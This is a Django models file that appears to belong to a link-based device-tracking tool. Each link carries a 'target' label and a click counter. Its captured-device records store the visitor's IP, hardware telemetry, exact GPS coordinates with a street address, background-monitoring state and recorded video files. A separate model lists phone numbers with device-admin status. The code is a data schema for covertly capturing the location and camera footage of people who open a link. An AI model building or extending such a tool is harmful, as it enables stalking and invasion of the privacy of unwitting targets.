import uuid
from django.db import models
from django.utils import timezone as django_timezone
from datetime import timedelta

class DeviceLink(models.Model):
    token = models.CharField(max_length=64, unique=True, default=uuid.uuid4)
    target_label = models.CharField(max_length=100, default="Android User")
    click_count = models.IntegerField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.target_label} ({self.token})"


class CapturedDeviceDetail(models.Model):
    link = models.ForeignKey(DeviceLink, on_delete=models.CASCADE, related_name="captured_details", null=True, blank=True)
    session_token = models.CharField(max_length=64, unique=True, default=uuid.uuid4)
    session_status = models.CharField(max_length=20, default='active') # 'active' or 'stopped'
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(blank=True)
    
    # OS & Hardware Specs
    device_model = models.CharField(max_length=100, default="Unknown Device")
    os_info = models.CharField(max_length=100, default="Android")
    browser_info = models.CharField(max_length=100, default="Unknown Browser")
    screen_res = models.CharField(max_length=50, default="Unknown")
    viewport_size = models.CharField(max_length=50, default="Unknown")
    pixel_ratio = models.CharField(max_length=20, default="1.0")
    gpu_info = models.CharField(max_length=200, default="Unknown GPU")
    
    # Telemetry
    battery_info = models.CharField(max_length=100, default="Unknown")
    network_info = models.CharField(max_length=100, default="Unknown")
    cpu_cores = models.IntegerField(default=0)
    ram_gb = models.CharField(max_length=50, default="Unknown")
    timezone = models.CharField(max_length=100, default="UTC")
    language = models.CharField(max_length=50, default="en-US")
    
    # Exact GPS Location
    latitude = models.FloatField(null=True, blank=True)
    longitude = models.FloatField(null=True, blank=True)
    location_accuracy = models.FloatField(null=True, blank=True) # in meters
    location_status = models.CharField(max_length=50, default="Pending") # Pending, Granted, Denied, Acquired
    location_address = models.TextField(null=True, blank=True) # Reverse-geocoded street address
    location_updated_at = models.DateTimeField(null=True, blank=True)


    # Real-time state
    is_online = models.BooleanField(default=True)
    page_focused = models.BooleanField(default=True)
    orientation = models.CharField(max_length=30, default="portrait")
    
    last_ping = models.DateTimeField(default=django_timezone.now)
    captured_at = models.DateTimeField(auto_now_add=True)

    @property
    def maps_url(self):
        if self.latitude is not None and self.longitude is not None:
            return f"https://www.google.com/maps?q={self.latitude},{self.longitude}"
        return None

    @property
    def is_recently_active(self):
        if self.session_status == 'stopped':
            return False
        return (django_timezone.now() - self.last_ping) <= timedelta(seconds=10)

    @property
    def session_state(self):
        if self.session_status == 'stopped':
            return 'stopped'
        if self.is_recently_active:
            return 'live_active'
        return 'background_monitored'

    def __str__(self):
        return f"{self.device_model} - {self.ip_address}"


class CapturedVideo(models.Model):
    device = models.ForeignKey(CapturedDeviceDetail, on_delete=models.CASCADE, related_name="recorded_videos")
    video_file = models.FileField(upload_to="captured_videos/")
    recorded_at = models.DateTimeField(auto_now_add=True)
    duration_sec = models.IntegerField(default=0)
    file_size_mb = models.CharField(max_length=20, default="0 MB")

    def __str__(self):
        return f"Video {self.id} - {self.device.device_model} ({self.recorded_at.strftime('%Y-%m-%d %H:%M:%S')})"



class EnterpriseAsset(models.Model):
    phone_number = models.CharField(max_length=30)
    asset_id = models.CharField(max_length=64, unique=True, default=uuid.uuid4)
    device_model = models.CharField(max_length=100, default='Android Enterprise Device')
    os_info = models.CharField(max_length=100, default='Android OS')
    admin_active = models.BooleanField(default=False)
    password_compliant = models.BooleanField(default=False)
    registered_at = models.DateTimeField(default=django_timezone.now)
    last_compliance_check = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.phone_number} ({self.device_model})"
